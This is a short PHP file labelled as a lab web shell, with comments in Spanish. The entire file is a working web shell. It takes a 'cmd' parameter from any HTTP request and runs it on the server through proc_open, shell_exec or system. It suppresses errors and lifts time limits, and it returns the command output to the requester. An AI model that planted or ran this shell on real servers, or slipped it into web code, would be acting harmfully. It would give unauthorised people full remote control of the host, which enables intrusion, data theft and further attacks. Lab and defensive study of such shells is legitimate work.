<?php
/*
 * PHP webshell (lab use)
 * Compatible with PHP 7.x / 8.x
 */

set_time_limit(0);
error_reporting(0);

// --- Configuración básica ---
$cmd = $_REQUEST['cmd'] ?? null;

// --- Normalización de entorno ---
if (function_exists('putenv')) {
    putenv('PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin');
}

// --- Función de ejecución robusta ---
function execute_command($command) {

    $output = '';

    if (function_exists('proc_open')) {
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];

        $process = proc_open($command, $descriptors, $pipes);

        if (is_resource($process)) {
            fclose($pipes[0]);
            $output .= stream_get_contents($pipes[1]);
            $output .= stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        }
        return $output;
    }
    
    // Ejecución Shell_exec
    if (function_exists('shell_exec')) {
        return shell_exec($command . ' 2>&1');
    }
    
    // Ejecución System
    if (function_exists('system')) {
        ob_start();
        system($command . ' 2>&1');
        return ob_get_clean();
    }
    // Si ninguna es válida
    return "No execution functions available.";
}

// --- Ejecución ---
if ($cmd) {
    echo "<pre>";
    echo htmlspecialchars(execute_command($cmd));
    echo "</pre>";
}
?>
